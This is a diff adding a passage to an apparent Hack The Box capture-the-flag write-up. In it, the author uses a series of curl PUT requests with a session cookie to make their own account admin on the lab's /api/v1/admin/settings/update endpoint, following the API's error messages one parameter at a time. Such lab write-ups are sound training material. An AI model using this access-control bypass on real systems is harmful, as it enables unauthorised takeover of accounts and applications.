@@ -110,6 +110,71 @@ curl 2million.htb/api/v1 --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" | jq
 }
 ```
 
+Here we can check if our own account is set as admin with curl, generate VPN, and update user settings. We are not admin as expected, but that can change with a call to **/api/v1/admin/settings/update**.
+
+```
+curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    53    0    53    0     0    425      0 --:--:-- --:--:-- --:--:--   427
+{
+  "status": "danger",
+  "message": "Invalid content type."
+}
+```
+
+Missing content type we add it:
+
+```
+curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" | jq 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    56    0    56    0     0    436      0 --:--:-- --:--:-- --:--:--   437
+{
+  "status": "danger",
+  "message": "Missing parameter: email"
+}
+```
+
+Another clue, lets add email: 
+
+```
+(base) simonstrombackolofsson@Simons-Air HTB % curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data  '{"email":"test@test.test"}' | jq 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    85    0    59  100    26    488    215 --:--:-- --:--:-- --:--:--   708
+{
+  "status": "danger",
+  "message": "Missing parameter: is_admin"
+}
+```
+
+Again...
+
+```
+curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data  '{"email":"test@test.test","is_admin":true}' | jq 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   118    0    76  100    42    628    347 --:--:-- --:--:-- --:--:--   975
+{
+  "status": "danger",
+  "message": "Variable is_admin needs to be either 0 or 1."
+}
+```
+Such a very generous api! Thank you for this very fine information!
+
+```
+curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data  '{"email":"test@test.test","is_admin":1}' | jq   
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    83    0    44  100    39    339    301 --:--:-- --:--:-- --:--:--   643
+{
+  "id": 18,
+  "username": "testtest",
+  "is_admin": 1
+}
+```
+Finally!
 
 
 
